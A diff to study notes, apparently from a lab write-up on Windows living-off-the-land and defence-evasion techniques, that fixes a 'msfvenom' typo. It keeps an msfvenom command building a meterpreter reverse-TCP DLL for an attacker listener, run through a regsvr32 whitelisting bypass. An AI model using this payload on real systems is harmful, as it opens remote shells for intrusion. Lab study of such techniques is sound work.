@@ -25,9 +25,12 @@ Findstr is a Microsoft built-in tool used to find text and string patterns in fi
 
 Windows Management Instrumentation (WMIC) is used to execute binaries for evading defensive measures. The MITRE ATT&CK framework refers to this technique as Signed Binary Proxy Execution (T1218).
 
-Application Whitelisting Bypasses:
+
+
+
+
   msfvenom -p windows/meterpreter/reverse_tcp LHOST=tun0 LPORT=443 -f dll -a x86 > live0fftheland.dll
-                                Create a malicious DLL file using `msvenom` and set up our  Metasploit listener to receive a reverse shell
+                                Create a malicious DLL file using `msfvenom` and set up our  Metasploit listener to receive a reverse shell
                                 Note that we will be creating a malicious file that works for 32bit operating systems. We will be using the `regsvr32.exe`
                                 Application Whitelisting Bypass technique to run a command on a target system.
                                 We specified the output type as `DLL` using the `-f` argument
